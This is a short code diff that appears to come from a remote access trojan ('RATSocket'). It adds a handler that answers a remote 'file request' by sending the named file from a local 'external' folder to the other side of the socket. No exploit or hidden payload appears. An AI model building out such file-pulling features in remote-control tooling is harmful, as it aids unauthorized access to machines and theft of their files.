@@ -62,3 +62,17 @@ class Client(RATSocket):
                 return 1, '\nFile saved to: {}'.format(os.path.abspath(filename))
             except Exception as e:
                 return 0, 'Error receiving file: {}'.format(e)
+        # 接收文件请求
+        elif type == 'file request':
+            filename = os.path.join(os.path.abspath('external'), self.recv_body(head))
+            if os.path.isfile(filename):
+                try:
+                    self.send_file(filename)
+                    print('\nFile sent: {}'.format(filename))
+                except Exception as e:
+                    self.send_command('null', 'null')
+                    print('Error sending file: {}'.format(e))
+            else:
+                self.send_command('null', 'null')
+                print('File does not exist: {}'.format(filename))
+            return self.recv_result()
